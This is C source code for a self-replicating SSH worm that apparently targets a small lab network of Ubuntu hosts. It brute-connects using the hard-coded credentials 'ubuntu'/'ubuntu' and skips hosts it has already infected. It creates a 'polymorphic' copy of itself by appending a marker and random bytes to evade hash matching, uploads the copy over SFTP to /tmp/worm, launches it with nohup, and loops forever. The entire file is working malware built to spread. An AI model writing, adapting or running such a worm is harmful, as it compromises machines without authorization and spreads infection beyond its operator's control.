// Simple self-replicating worm - minimal implementation
// Connects via SSH and copies itself to all targets

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <libssh/libssh.h>
#include <libssh/sftp.h>
#include <fcntl.h>
#include <sys/stat.h>

// Configuration
#define SSH_USER "ubuntu"
#define SSH_PASS "ubuntu"
#define SSH_PORT 22
#define WORM_PATH "/tmp/worm"

// Network scanner - try common subnets
const char *subnets[] = {
    "172.28.1",  // net_1_2 (ubuntu1-ubuntu2)
    "172.28.2",  // net_1_3 (ubuntu1-ubuntu3)
    "172.28.3",  // net_2_4 (ubuntu2-ubuntu4)
    "172.28.4",  // net_3_5 (ubuntu3-ubuntu5)
    NULL
};

// Upload file via SFTP
int upload_file(ssh_session session, const char *local, const char *remote) {
    sftp_session sftp = sftp_new(session);
    if (!sftp || sftp_init(sftp) != SSH_OK) {
        if (sftp) sftp_free(sftp);
        return -1;
    }

    int fd = open(local, O_RDONLY);
    if (fd < 0) {
        sftp_free(sftp);
        return -1;
    }

    sftp_file file = sftp_open(sftp, remote, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (!file) {
        close(fd);
        sftp_free(sftp);
        return -1;
    }

    char buffer[4096];
    ssize_t nread;
    while ((nread = read(fd, buffer, sizeof(buffer))) > 0) {
        if (sftp_write(file, buffer, nread) != nread) {
            sftp_close(file);
            sftp_free(sftp);
            close(fd);
            return -1;
        }
    }

    sftp_close(file);
    sftp_free(sftp);
    close(fd);
    return 0;
}

// Execute command via SSH
int exec_command(ssh_session session, const char *cmd) {
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return -1;

    if (ssh_channel_open_session(channel) != SSH_OK ||
        ssh_channel_request_exec(channel, cmd) != SSH_OK) {
        ssh_channel_free(channel);
        return -1;
    }

    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return 0;
}

// Infect a single target
void infect_target(const char *ip) {
    printf("[*] Attempting: %s\n", ip);

    // Create SSH session
    ssh_session session = ssh_new();
    if (!session) return;

    ssh_options_set(session, SSH_OPTIONS_HOST, ip);
    int timeout = 2;  // Short timeout for scanning
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
    ssh_options_set(session, SSH_OPTIONS_PORT, &(int){SSH_PORT});
    ssh_options_set(session, SSH_OPTIONS_USER, SSH_USER);

    // Connect
    if (ssh_connect(session) != SSH_OK) {
        ssh_free(session);
        return;
    }

    // Authenticate
    if (ssh_userauth_password(session, NULL, SSH_PASS) != SSH_AUTH_SUCCESS) {
        ssh_disconnect(session);
        ssh_free(session);
        return;
    }

    printf("[+] Connected: %s\n", ip);

    // Check if already infected
    char check_cmd[256];
    snprintf(check_cmd, sizeof(check_cmd), "test -f %s && echo infected", WORM_PATH);
    
    ssh_channel channel = ssh_channel_new(session);
    if (channel) {
        if (ssh_channel_open_session(channel) == SSH_OK &&
            ssh_channel_request_exec(channel, check_cmd) == SSH_OK) {
            
            char buffer[128];
            int nbytes = ssh_channel_read(channel, buffer, sizeof(buffer) - 1, 0);
            if (nbytes > 0) {
                buffer[nbytes] = '\0';
                if (strstr(buffer, "infected")) {
                    printf("[!] Already infected: %s\n", ip);
                    ssh_channel_close(channel);
                    ssh_channel_free(channel);
                    ssh_disconnect(session);
                    ssh_free(session);
                    return;
                }
            }
        }
        ssh_channel_close(channel);
        ssh_channel_free(channel);
    }

    // Get self path
    char self_path[1024];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) {
        strcpy(self_path, WORM_PATH);
    } else {
        self_path[len] = '\0';
    }

    // Create polymorphic variant
    printf("[*] Creating polymorphic variant for: %s\n", ip);
    char temp_path[] = "/tmp/worm_XXXXXX";
    int temp_fd = mkstemp(temp_path);
    if (temp_fd < 0) {
        printf("[-] Failed to create temp file\n");
        ssh_disconnect(session);
        ssh_free(session);
        return;
    }

    // Magic marker to identify end of original binary
    const char *marker = "DEADBEEF_WORM_END";
    size_t marker_len = strlen(marker);

    // Copy original binary (up to marker if present)
    int src_fd = open(self_path, O_RDONLY);
    if (src_fd < 0) {
        close(temp_fd);
        unlink(temp_path);
        ssh_disconnect(session);
        ssh_free(session);
        return;
    }

    // Read entire file into memory to search for marker
    // (Simple approach for small worm)
    struct stat st;
    fstat(src_fd, &st);
    char *file_content = malloc(st.st_size);
    if (!file_content) {
        close(src_fd);
        close(temp_fd);
        unlink(temp_path);
        ssh_disconnect(session);
        ssh_free(session);
        return;
    }

    ssize_t total_read = 0;
    while (total_read < st.st_size) {
        ssize_t n = read(src_fd, file_content + total_read, st.st_size - total_read);
        if (n <= 0) break;
        total_read += n;
    }
    close(src_fd);

    // Find marker - we need the LAST occurrence because the string literal
    // itself exists in the binary's data section.
    char *found = NULL;
    char *current = file_content;
    while ((current = memmem(current, total_read - (current - file_content), marker, marker_len))) {
        found = current;
        current += 1; // Advance to search for next
    }

    // If found, we want to keep everything UP TO the marker.
    // But wait, if it's the FIRST generation, 'found' will point to the string literal inside the binary.
    // We don't want to cut there!
    
    // Heuristic: If the marker is found very close to the end (e.g. within last 100 bytes),
    // it's likely the appended one. The string literal is usually further back.
    // Or simpler: The appended marker is at offset X. The file size is X + marker_len + random_bytes.
    // So if (total_read - (found - file_content)) < (marker_len + 100), it's the appended one.
    
    size_t write_len = total_read;
    if (found) {
        size_t offset = found - file_content;
        size_t remaining = total_read - offset;
        
        // If remaining is small (marker + junk < 100 bytes), it's the appended marker
        if (remaining < (marker_len + 100)) {
            write_len = offset;
        }
    }

    // Write original content (stripped of previous junk)
    write(temp_fd, file_content, write_len);
    free(file_content);

    // Write marker
    write(temp_fd, marker, marker_len);

    // Add random polymorphic data (10-50 bytes)
    int random_bytes = 10 + (rand() % 41);
    unsigned char random_data[64];
    for (int i = 0; i < random_bytes; i++) {
        random_data[i] = rand() % 256;
    }
    write(temp_fd, random_data, random_bytes);
    
    close(temp_fd);
    chmod(temp_path, 0755);

    printf("[*] Uploading polymorphic worm to: %s\n", ip);
    if (upload_file(session, temp_path, WORM_PATH) < 0) {
        printf("[-] Upload failed: %s\n", ip);
        unlink(temp_path);
        ssh_disconnect(session);
        ssh_free(session);
        return;
    }

    // Cleanup temp file
    unlink(temp_path);

    printf("[+] Uploaded: %s\n", ip);

    // Execute worm on remote host
    char exec_cmd[256];
    snprintf(exec_cmd, sizeof(exec_cmd), "nohup %s > /dev/null 2>&1 &", WORM_PATH);
    exec_command(session, exec_cmd);

    printf("[+] INFECTED: %s\n", ip);

    ssh_disconnect(session);
    ssh_free(session);
}

int main() {
    // Initialize random seed for polymorphism using /dev/urandom
    unsigned int seed;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        read(fd, &seed, sizeof(seed));
        close(fd);
        srand(seed);
    } else {
        srand(time(NULL) ^ getpid());
    }
    
    printf("=== Simple Worm - Network Propagation ===\n");

    while (1) {
        printf("\n[*] Starting infection round...\n");

        // Scan all subnets
        for (int s = 0; subnets[s] != NULL; s++) {
            // Try hosts .2 and .3 in each subnet
            for (int host = 2; host <= 3; host++) {
                char ip[32];
                snprintf(ip, sizeof(ip), "%s.%d", subnets[s], host);
                infect_target(ip);
            }
        }

        printf("[*] Round complete. Sleeping 10 seconds...\n");
        sleep(10);
    }

    return 0;
}
